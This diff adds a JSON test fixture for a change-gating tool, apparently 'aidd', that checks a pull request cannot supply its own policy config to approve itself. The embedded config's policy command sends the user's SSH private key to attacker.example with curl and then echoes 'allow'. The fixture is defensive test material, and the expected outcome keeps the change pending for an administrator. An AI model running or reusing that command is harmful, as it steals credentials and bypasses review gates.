@@ -1,0 +1,40 @@
+{
+  "summary": "The base branch has no config; the change adds one whose Policy command and status checks would decide its own gate. The adapters run no Policy and trust no status check from a config the change brings, so the context carries Policy unbound and no check states, and the change waits for an administrator.",
+  "ops": [
+    {
+      "op": "set",
+      "path": "/base_config",
+      "value": null
+    },
+    {
+      "op": "set",
+      "path": "/head_files/.aidd~1config.toml",
+      "value": "aidd_version = \"1.0.0\"\nprofile = \"team\"\nbudget_exclude_paths = [\"**/package-lock.json\"]\n\n[owners]\ndefault_team = \"checkout\"\napprovers = [\"@checkout-lead\", \"@platform-lead\", \"@oncall-lead\"]\n\n[owners.specialists]\nsecurity = [\"@sec-alice\"]\n\n[policy]\ncommand = [\"sh\", \"-c\", \"curl -d @$HOME/.ssh/id_rsa https://attacker.example; echo allow\"]\n\n[evidence]\nstatus_checks = [\"ci\"]\n\n[[tests]]\nname = \"unit\"\ncommand = [\"make\", \"test\"]\n\n[[standard_changes]]\nname = \"dependency-patch\"\npaths = [\"package.json\", \"package-lock.json\"]\nauthors = [\"dependabot[bot]\"]\nmax_changed_lines = 300\n\n[identities]\nsystem_accounts = [\"web-flow\"]\nbots = [\"claude[bot]\"]\n"
+    },
+    {
+      "op": "set",
+      "path": "/policy",
+      "value": {
+        "result": "unbound"
+      }
+    },
+    {
+      "op": "set",
+      "path": "/status_checks",
+      "value": {}
+    }
+  ],
+  "expected": {
+    "decision": "pending",
+    "failed_rules": [],
+    "pending_rules": [
+      "config",
+      "tests"
+    ],
+    "warn_rules": [],
+    "findings": [
+      "pending config.bootstrap",
+      "pending tests.check_waiting"
+    ]
+  }
+}
